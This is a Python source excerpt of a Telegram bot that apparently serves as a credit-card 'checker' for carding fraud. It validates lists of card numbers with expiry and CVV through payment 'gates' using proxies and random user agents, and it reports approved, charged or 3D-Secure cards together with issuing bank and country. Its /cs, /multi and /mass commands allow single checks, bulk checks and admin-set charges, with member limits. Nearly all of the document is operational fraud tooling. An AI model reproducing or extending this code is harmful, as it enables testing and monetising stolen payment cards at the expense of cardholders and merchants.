        elif is_vn_decline:
            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                             f"**💳 Card:** `{original_line}`\n"
                             f"**🚦 Status: ❌ DECLINED**\n"
                             f"**💬 Response:** `DECLINED (Vietnam BIN)`\n\n"
                             f"**🏦 Gateway:** `{gate_name}`\n\n"
                             f"**⏱️ Took:** `{duration:.2f}s`\n\n"
                             f"👤 *Checker by: {ADMIN_USERNAME}*")
        
        else:
            status_text = ""
            response_message = ""
            
            # Default status mapping for errors and complex cases
            status_map = {
                'custom': ("🔒 3D SECURE", full_response),
                'invalid_format': ("📋 FORMAT ERROR", full_response),
                'error': ("❗️ ERROR", full_response),
                'unknown': ("❔ UNKNOWN", full_response),
            }

            # Determine status text and simple response message
            if status == 'live_success':
                status_text = "✅ Approved"
                response_message = "Card Added Successfully 💳"
            elif status == 'decline':
                status_text = "❌ DECLINED"
                response_message = "Card Declined"
            elif status == 'success':
                try:
                    amount_charged_raw = int(full_response.split('_')[1])
                    amount_in_usd = amount_charged_raw / 100.0
                    status_text = f"✅ CHARGED {amount_in_usd:.2f}$"
                    response_message = f"Transaction successful for {amount_in_usd:.2f}$."
                except (ValueError, IndexError):
                    status_text = "✅ CHARGED"
                    response_message = "Transaction successful!"
            else:
                status_text, response_message = status_map.get(status, status_map['unknown'])

            brand = (bin_info.get('brand') or 'N/A').upper()
            card_type = (bin_info.get('type') or 'N/A').upper()
            level = (bin_info.get('level') or 'N/A').upper()
            bank = bin_info.get('bank') or 'None'
            country_name = (bin_info.get('country_name') or 'N/A').upper()
            country_code = bin_info.get('country_code')
            flag = get_flag_emoji(country_code)
            
            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
            bin_info_line = " – ".join(bin_info_parts)

            bin_details_str = (
                f"🆔 **BIN:** {bin_info_line}\n"
                f"🏛️ **Bank:** {bank}\n"
                f"🌐 **Country:** {country_name} {flag}"
            )
            
            response_display_part = ""
            # NEW LOGIC: Differentiate display for Admin vs Member on 'unknown' status
            if is_charge_mode and status == 'custom':
                # User request: for charge mode, show simple message for 3D
                response_display_part = f"**💬 Response:** `3D Secure Required`"
            elif status == 'unknown':
                if user.id == ADMIN_ID:
                    safe_response = str(response_message)[:1000] # response_message has full_response
                    response_display_part = f"**💬 Response:**\n```json\n{safe_response}\n```"
                else:
                    response_display_part = f"**💬 Response:** `Unknown`"
            elif status in ['custom', 'invalid_format', 'error']:
                # For other errors, or for 'custom' in live mode, show the details
                safe_response = str(response_message)[:1000]
                response_display_part = f"**💬 Response:**\n```json\n{safe_response}\n```"
            else:
                # For success, live_success, decline, show the simple message
                response_display_part = f"**💬 Response:** `{response_message}`"


            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                             f"**💳 Card:** `{original_line}`\n"
                             f"**🚦 Status: {status_text}**\n"
                             f"{response_display_part}\n\n"
                             f"ℹ️ **BIN Info:**\n{bin_details_str}\n\n"
                             f"**🏦 Gateway:** `{gate_name}`\n\n"
                             f"**⏱️ Took:** `{duration:.2f}s`\n\n"
                             f"👤 *Checker by: {ADMIN_USERNAME}*")
        
        await msg.edit_text(final_message)
        
    except Exception as e:
        logger.error(f"Error in _process_single_check function: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await msg.edit_text(f"⛔️ **System Error:**\n```\n{safe_error_message}\n```")

async def cs_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"You are not authorized to use this command. Please contact the Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return

    if not context.args: await update.message.reply_text("Usage: `/cs cc|mm|yy|cvv` or `/cs cc|mm/yy|cvv`"); return
    
    line = " ".join(context.args)
    await _process_single_check(update, context, line)

async def cs_custom_amount_command(update, context):
    """Handler for the admin's /cs<amount> command."""
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        # Silently ignore if not admin to avoid confusion
        return
        
    if not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"]) # Admin always sees english
        return

    # Get amount from regex
    match = re.match(r'/cs(\d+)', update.message.text, re.IGNORECASE)
    if not match: return # No match, not an error
        
    try:
        custom_charge_amount = int(match.group(1))
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid charge amount.")
        return

    # Get card part from the message
    card_info_str = update.message.text[len(match.group(0)):].strip()
    if not card_info_str:
        await update.message.reply_text(f"Usage: `/cs{custom_charge_amount} cc|mm|yy|cvv`")
        return
        
    await _process_single_check(update, context, card_info_str, custom_charge_amount=custom_charge_amount)


async def multi_check_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"You are not authorized to use this command. Please contact the Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return
        
    if user.id in ACTIVE_CHECKS:
        await update.message.reply_text("You already have another check task running. Please wait for it to complete or use /stop.", quote=True)
        return

    text_content = update.message.text.split('/multi', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("Usage: Use `/multi` and then paste your card list on the next line."); return

    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if total_lines == 0:
        await update.message.reply_text("No cards to check."); return

    if user.id != ADMIN_ID:
        user_limit = get_user_multi_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"⛔️ **Limit Exceeded!**\n\n"
                f"You sent `{total_lines}` cards, but your limit for the /multi command is `{user_limit}` cards at a time.\n\n"
                f"To increase your limit, please contact the admin {ADMIN_USERNAME}."
            )
            return

    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)
    
    keyboard = [[InlineKeyboardButton("🛑 Stop My Task", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_message = await update.message.reply_text(f"⏳ Initializing... Preparing to check `{total_lines}` cards via **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    
    cancel_event = threading.Event()
    loop = asyncio.get_running_loop() # Get the current event loop
    try:
        ACTIVE_CHECKS[user.id] = {
            "full_name": user.full_name,
            "username": user.username,
            "start_time": time.time(),
            "task_type": "multi"
        }
        CANCELLATION_EVENTS[user.id] = cancel_event

        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        results = {k: [] for k in counts.keys()}
        processed_count = 0
        last_update_time = time.time()
        num_threads = min(10, total_lines) 
        gate_died_flag = False
        stopped_due_to_http_error = False
        persistent_http_error_count = 0
        gate_fail_card = ""

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card_with_retry, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break

                processed_count += 1
                try:
                    status, original_line, full_response, bin_info, had_persistent_error = future.result()
                    
                    if user.id != ADMIN_ID and status in ['error', 'unknown']:
                        debug_info = f"🐞 DEBUG ALERT (/multi from user {user.id}):\nCard: {original_line}\nResponse: {str(full_response)[:3500]}"
                        coro = context.bot.send_message(chat_id=ADMIN_ID, text=debug_info)
                        asyncio.run_coroutine_threadsafe(coro, loop)

                    if had_persistent_error:
                        persistent_http_error_count += 1
                        results['error'].append(f"❗️ `{original_line}` | Persistent HTTP error: {full_response}")
                        # Stop if too many errors
                        proxy_config = load_proxies()
                        if proxy_config.get("enabled") and persistent_http_error_count > 10:
                            logger.error("Stopping /multi task due to too many persistent HTTP errors.")
                            stopped_due_to_http_error = True
                            cancel_event.set()
                        continue
                            
                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        continue

                    counts[status] = counts.get(status, 0) + 1
                    status_icons = {'success': '✅', 'live_success': '✅', 'decline': '❌', 'custom': '🔒', 'invalid_format': '📋', 'error': '❗️', 'unknown': '❔', 'cancelled': '🛑'}
                    
                    # --- MODIFIED: Create detailed bin string ---
                    brand = (bin_info.get('brand') or 'N/A').upper()
                    card_type = (bin_info.get('type') or 'N/A').upper()
                    level = (bin_info.get('level') or 'N/A').upper()
                    bank = (bin_info.get('bank') or 'N/A')
                    country_name = (bin_info.get('country_name') or 'N/A').upper()

                    bin_parts = [p for p in [bank, brand, card_type, level, country_name] if p and p != 'N/A']
                    bin_str = " - ".join(bin_parts)
                    # --- END MODIFICATION ---

                    result_line = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (VN BIN)`"
                        elif full_response == 'INVALID_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid BIN)`"
                        elif full_response == 'EXPIRED_CARD_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Expired)`"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid Card Number)`"
                        elif full_response == 'CARD_NOT_ALLOWED_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Not Supported)`"
                        else: result_line = f"{status_icons['decline']} `{original_line}`"
                    elif status == 'live_success':
                        result_line = f"{status_icons['live_success']} `{original_line}` | Approved | `{bin_str}`"
                    elif status == 'success':
                        try:
                            amount_charged_raw = int(full_response.split('_')[1])
                            amount_in_usd = amount_charged_raw / 100.0
                            charge_msg = f"| Charge {amount_in_usd:.2f}$ successfull"
                        except (ValueError, IndexError):
                            charge_msg = "| Charged Successfully"
                        result_line = f"{status_icons['success']} `{original_line}` | `{bin_str}` {charge_msg}"
                    elif status == 'invalid_format': result_line = f"{status_icons[status]} `{original_line}` | Reason: {str(full_response)[:50]}" 
                    elif status == 'cancelled': continue
                    elif status == 'error' and had_persistent_error: # Already handled
                        continue
                    else:
                        if status == 'unknown':
                            result_line = f"{status_icons.get(status, '❔')} `{original_line}` | Unknown"
                        else: # For 'custom' and other non-persistent errors
                            result_line = f"{status_icons.get(status, '❔')} `{original_line}` | `{bin_str}`"

                    if result_line: results[status].append(result_line)

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Error processing future for card {original_line}: {e}", exc_info=True)
                    counts['error'] += 1
                    results['error'].append(f"❗️ `{original_line}` | Processing error: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent

                    status_lines = [
                        f"**🚀 Checking in progress...**\n{progress_bar}\n",
                        f"💻 **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    # Check if the gate is a charge gate
                    is_charge_gate = (active_gate in ['1', '2', '3', '4', '6', '8', '9'] and (
                        (active_gate == '1' and get_gate1_mode() == 'charge') or
                        (active_gate == '2' and get_gate2_mode() == 'charge') or
                        (active_gate == '3' and get_gate3_mode() == 'charge') or
                        (active_gate in ['4', '6']) or
                        (active_gate == '8' and get_gate8_mode() == 'charge') or
                        (active_gate == '9' and get_gate9_mode() == 'charge')
                    ))

                    if is_charge_gate:
                        status_lines.append(f"✅ **Charged:** `{counts['success']}`")
                    
                    status_lines.extend([
                        f"✅ **Approved:** `{counts['live_success']}`",
                        f"❌ **Declined:** `{counts['decline']}`",
                        f"🔒 **3D Secure:** `{counts['custom']}` | ❔ **Errors:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)

                    try:
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Error updating /multi progress: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Unknown error updating /multi progress: {e}")
                    last_update_time = time.time()
                
        duration = time.time() - start_time
        update_user_stats(user.id, user, counts)

        if stopped_due_to_http_error:
            await status_message.edit_text(
                f"🛑 **CHECK STOPPED - TOO MANY HTTP ERRORS** 🛑\n\n"
                f"**Reason:** The tool was stopped because more than 10 cards failed with a persistent HTTP connection error while using proxies.\n"
                f"This usually indicates a network problem or an issue with the payment gateway.\n\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return

        if gate_died_flag:
            await status_message.edit_text(
                f"🛑 **CHECK STOPPED - GATE DIED** 🛑\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return

        if cancel_event.is_set():
            await status_message.edit_text(f"🛑 **Task has been stopped by request.**\n\nProcessed: {processed_count}/{total_lines} cards.", reply_markup=None)
            return

        final_header = [
            f"**📊 Check Complete!**\n",
            f"**Gate Used:** `{gate_name}`",
            f"**Total Cards:** `{total_lines}`",
            f"**Time Taken:** `{duration:.2f}s`\n",
        ]

        final_counts = []
        is_charge_gate = (active_gate in ['1', '2', '3', '4', '6', '8', '9'] and (
            (active_gate == '1' and get_gate1_mode() == 'charge') or
            (active_gate == '2' and get_gate2_mode() == 'charge') or
            (active_gate == '3' and get_gate3_mode() == 'charge') or
            (active_gate in ['4', '6']) or
            (active_gate == '8' and get_gate8_mode() == 'charge') or
            (active_gate == '9' and get_gate9_mode() == 'charge')
        ))
        if is_charge_gate:
            final_counts.append(f"✅ **Charged:** `{counts['success']}`")
        
        final_counts.extend([
            f"✅ **Approved:** `{counts['live_success']}`",
            f"❌ **Declined:** `{counts['decline']}`",
            f"🔒 **3D Secure:** `{counts['custom']}`",
            f"📋 **Invalid Format:** `{counts['invalid_format']}`",
            f"❗️ **Errors:** `{counts['error']}`\n",
            f"-----------------------------------------"
        ])

        final_message = final_header + final_counts
        
        if results['live_success']: final_message.extend(("\n**✅ APPROVED:**", *results['live_success']))
        if results['success'] and is_charge_gate: final_message.extend(("\n**✅ CHARGED CARDS:**", *results['success']))
        if results['custom']: final_message.extend(("\n**🔒 3D SECURE CARDS:**", *results['custom']))
        if results['decline']: final_message.extend(("\n**❌ DECLINED CARDS:**", *results['decline']))
        if results['invalid_format']: final_message.extend(("\n**📋 INVALID FORMAT:**", *results['invalid_format']))
        if results['error']: final_message.extend(("\n**❗️ ERRORS:**", *results['error']))
        if results['unknown']: final_message.extend(("\n**❔ UNKNOWN:**", *results['unknown']))

        final_text = "\n".join(final_message)
        
        if len(final_text) > 4096:
            await status_message.edit_text("Result is too long to display. Sending as a file.", reply_markup=None)
            with io.BytesIO(final_text.encode('utf-8')) as file_to_send:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename="multi_check_results.txt")
        else:
            await status_message.edit_text(final_text, reply_markup=None)

    except Exception as e:
        logger.error(f"Error in /multi: {e}", exc_info=True)
        await status_message.edit_text(f"⛔️ **Critical Error!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def mass_check_handler(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"You are not authorized to use this command. Please contact the Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return
    
    if user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
        await update.message.reply_text("You already have another check task running. Please wait for it to complete or use /stop.", quote=True)
        return 

    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if not lines: await update.message.reply_text("📂 The file is empty."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"⛔️ **Limit Exceeded!**\n\n"
                f"Your file has `{total_lines}` lines, but your limit is `{user_limit}` lines.\n\n"
                f"Please contact admin {ADMIN_USERNAME} to increase your limit."
            )
            return

    caption = update.message.caption or "/mass"
    
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10

    if user.id != ADMIN_ID:
        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"⚠️ **Thread Limit!** Members can use a maximum of {MEMBER_THREAD_LIMIT} threads. Automatically adjusted.",
                quote=True
            )
    else:
        # Admin has no thread limit
        num_threads = requested_threads

    num_threads = max(1, num_threads)

    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)

    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    keyboard = [[InlineKeyboardButton("🛑 Stop My Task", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_message = await update.message.reply_text(f"⏳ Initializing... Preparing to check `{total_lines}` cards with `{num_threads}` threads via **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    
    cancel_event = threading.Event()
    loop = asyncio.get_running_loop() # Get the current event loop
    try:
        ACTIVE_CHECKS[user.id] = {
            "full_name": user.full_name,
            "username": user.username,
            "start_time": time.time(),
            "task_type": "mass"
        }
        CANCELLATION_EVENTS[user.id] = cancel_event

        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()
        gate_died_flag = False
        stopped_due_to_http_error = False
        persistent_http_error_count = 0
        gate_fail_card = ""

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card_with_retry, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break

                processed_count += 1
                try:
                    status, original_line, full_response, bin_info, had_persistent_error = future.result()
                    
                    if status in ['error', 'unknown']:
                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
                        result_lists['error_debug'].append(debug_info)
                        if user.id != ADMIN_ID:
                            coro = context.bot.send_message(chat_id=ADMIN_ID, text=f"🐞 DEBUG ALERT (user {user.id}):\n{debug_info}")
                            asyncio.run_coroutine_threadsafe(coro, loop)
            
                    if had_persistent_error:
                        persistent_http_error_count += 1
                        result_lists['error'].append(f"{original_line} | Persistent HTTP error: {full_response}")
                        # Stop if too many errors
                        proxy_config = load_proxies()
                        if proxy_config.get("enabled") and persistent_http_error_count > 10:
                            logger.error("Stopping /mass task due to too many persistent HTTP errors.")
                            stopped_due_to_http_error = True
                            cancel_event.set()
                        continue

                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        result_lists['error'].append(f"{original_line} | GATE DIED (Forbidden)")
                        continue
                 
                    counts[status] = counts.get(status, 0) + 1
                    
                    # --- MODIFIED: Create detailed bin string for file output ---
                    brand = (bin_info.get('brand') or 'N/A').upper()
                    card_type = (bin_info.get('type') or 'N/A').upper()
                    level = (bin_info.get('level') or 'N/A').upper()
                    bank = (bin_info.get('bank') or 'N/A')
                    country_name = (bin_info.get('country_name') or 'N/A').upper()

                    bin_parts = [p for p in [bank, brand, card_type, level, country_name] if p and p != 'N/A']
                    bin_str_details = " - ".join(bin_parts)
                    # --- END MODIFICATION ---

                    line_to_save = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (VN BIN)"
                        elif full_response == 'INVALID_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid BIN)"
                        elif full_response == 'EXPIRED_CARD_DECLINE': line_to_save = f"{original_line} | DECLINED (Expired)"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid Card Number)"
                        elif full_response == 'CARD_NOT_ALLOWED_DECLINE': line_to_save = f"{original_line} | DECLINED (Not Supported)"
                        else: line_to_save = f"{original_line} | DECLINED"
                    elif status == 'live_success':
                        line_to_save = f"{original_line} | APPROVED✅ | {bin_str_details}"
                    elif status == 'success':
                        try:
                            amount_charged_raw = int(full_response.split('_')[1])
                            amount_in_usd = amount_charged_raw / 100.0
                            charge_msg = f"| Charge {amount_in_usd:.2f}$ successfull"
                        except (ValueError, IndexError):
                            charge_msg = "| Charged Successfully"
                        line_to_save = f"{original_line} {charge_msg} | {bin_str_details}"
                    elif status == 'invalid_format': line_to_save = f"{original_line} | Reason: {full_response}"
                    elif status == 'cancelled': continue
                    elif status == 'error' and had_persistent_error: # Already handled
                        continue
                    else:
                        if status == 'unknown':
                            line_to_save = f"{original_line} | Unknown"
                        else: # For 'custom' and other non-persistent errors
                            line_to_save = f"{original_line} | {bin_str_details}"
                    
                    if line_to_save: result_lists[status].append(line_to_save)

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Error processing future for card {original_line} in /mass: {e}", exc_info=True)
                    counts['error'] += 1
                    result_lists['error'].append(f"{original_line} | Processing error: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    
                    status_lines = [
                        f"**🚀 Checking in progress...**\n{progress_bar}\n",
                        f"💻 **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    # Check if the gate is a charge gate
                    is_charge_gate = (active_gate in ['1', '2', '3', '4', '6', '8', '9'] and (
                        (active_gate == '1' and get_gate1_mode() == 'charge') or
                        (active_gate == '2' and get_gate2_mode() == 'charge') or
                        (active_gate == '3' and get_gate3_mode() == 'charge') or
                        (active_gate in ['4', '6']) or
                        (active_gate == '8' and get_gate8_mode() == 'charge') or
                        (active_gate == '9' and get_gate9_mode() == 'charge')
                    ))
                    if is_charge_gate:
                        status_lines.append(f"✅ **Charged:** `{counts['success']}`")
                    
                    status_lines.extend([
                        f"✅ **Approved:** `{counts['live_success']}`",
                        f"❌ **Declined:** `{counts['decline']}`",
                        f"🔒 **3D Secure:** `{counts['custom']}`",
                        f"📋 **Invalid Format:** `{counts['invalid_format']}`",
                        f"❔ **Errors:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)

                    try: 
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Error updating /mass progress: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Unknown error updating /mass progress: {e}")
                    last_update_time = time.time()
                
        duration = time.time() - start_time
        
        counts['cancelled'] = total_lines - processed_count

        if stopped_due_to_http_error:
            final_summary_text = (
                f"🛑 **CHECK STOPPED - TOO MANY HTTP ERRORS** 🛑\n\n"
                f"**Reason:** The tool was stopped because more than 10 cards failed with a persistent HTTP connection error while using proxies.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`\n\n"
                f"The processed results will be sent."
            )
        elif gate_died_flag:
            final_summary_text = (
                f"🛑 **CHECK STOPPED - GATE DIED** 🛑\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`\n\n"
                f"The processed results will be sent."
            )
        elif cancel_event.is_set():
            final_summary_text = (
                f"🛑 **Task has been stopped by request.**\n\n"
                f"Processed: {processed_count}/{total_lines} cards. The processed results will be sent."
            )
        else:
            summary_lines = [
                f"**📊 Check Complete!**\n",
                f"**Gate Used:** `{gate_name}`",
                f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n"
            ]
            is_charge_gate = (active_gate in ['1', '2', '3', '4', '6', '8', '9'] and (
                (active_gate == '1' and get_gate1_mode() == 'charge') or
                (active_gate == '2' and get_gate2_mode() == 'charge') or
                (active_gate == '3' and get_gate3_mode() == 'charge') or
                (active_gate in ['4', '6']) or
                (active_gate == '8' and get_gate8_mode() == 'charge') or
                (active_gate == '9' and get_gate9_mode() == 'charge')
            ))
            if is_charge_gate:
                summary_lines.append(f"✅ **Charged:** `{counts['success']}`")
            
            summary_lines.extend([
                f"✅ **Approved:** `{counts['live_success']}`",
                f"❌ **Declined:** `{counts['decline']}`",
                f"🔒 **3D Secure:** `{counts['custom']}`",
                f"📋 **Invalid Format:** `{counts['invalid_format']}`",
                f"❔ **Errors:** `{counts['error']}`",
                f"🛑 **Cancelled:** `{counts['cancelled']}`\n",
                f"**⏱️ Took:** `{duration:.2f}s`"
            ])
            final_summary_text = "\n".join(summary_lines)
        
        await status_message.edit_text(final_summary_text, reply_markup=None)

        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        
        update_user_stats(user.id, user, counts)

        file_map = {
            'success': 'charged.txt', 'live_success': 'approved.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt', 'unknown': 'unknown.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f: f.write("\n".join(result_lists[status]))
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)

        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f: f.write("\n\n---\n\n".join(result_lists['error_debug']))
            with open(debug_path, 'rb') as doc: await context.bot.send_document(chat_id=ADMIN_ID, document=doc)

    except Exception as e:
        logger.error(f"Error in mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"⛔️ **Critical Error!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

# --- STOP TASK COMMAND ---
async def stop_command(update, context):
    user = update.effective_user
    target_user_id = user.id

    if user.id == ADMIN_ID and context.args:
        try: target_user_id = int(context.args[0])
        except (ValueError, IndexError):
            await update.message.reply_text("❌ Invalid User ID. Usage: `/stop <user_id>`"); return
    elif user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text("You do not have permission to use this command."); return

    if target_user_id in CANCELLATION_EVENTS:
        CANCELLATION_EVENTS[target_user_id].set()
        if target_user_id == user.id:
            await update.message.reply_text("⏳ Stop request sent. The task will stop after finishing the currently checking cards...")
        else:
            await update.message.reply_text(f"⏳ Sent request to stop the task of user `{target_user_id}`.")
    else:
        if target_user_id == user.id:
            await update.message.reply_text("ℹ️ You have no running /mass or /multi tasks.")
        else:
            await update.message.reply_text(f"ℹ️ User `{target_user_id}` has no running tasks.")


# --- MANAGEMENT & NOTIFICATION COMMANDS ---

async def active_checks_command(update, context):
    """(Admin) Shows currently running tasks with stop buttons."""
    if update.effective_user.id != ADMIN_ID: return

    if not ACTIVE_CHECKS:
        await update.message.reply_text("✅ There are no check tasks currently running.")
        return

    message = "🏃‍♂️ **Active Tasks:**\n\n"
    now = time.time()
    
    keyboard = []
    active_checks_copy = dict(ACTIVE_CHECKS)

    for user_id, data in active_checks_copy.items():
        duration = now - data.get('start_time', now)
        username = f"@{data.get('username')}" if data.get('username') else "N/A"
        full_name = data.get('full_name', 'N/A')
        task_type = data.get('task_type', 'N/A').upper()
        
        message += (f"👤 **User:** {full_name} ({username}) | ID: `{user_id}`\n"
                    f"   - **Command:** `/{task_type}`\n"
                    f"   - **Runtime:** `{int(duration)}` seconds\n"
                    f"--------------------\n")
        
        # Add a stop button for each user
        keyboard.append([InlineKeyboardButton(f"🛑 Stop {full_name}'s Task", callback_data=f"stop_task_{user_id}")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup)


def _perform_gate_check(gate_id: str, card_line: str):
    """
    Helper function to perform a detailed check on a specific gate for the /status command.
    Returns: (overall_status, transaction_id_info, second_request_response)
    """
    cc, mes, ano, cvv = card_line.split('|')
    ano_full = f"20{ano}"
    session = requests.Session()

    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
                logger.info(f"Status check for Gate {gate_id} using proxy.")
        except IndexError:
            logger.warning("Proxy enabled but list is empty for status check.")

    user_agent = random_user_agent()
    transaction_id = None
    transaction_id_info = "Not attempted."
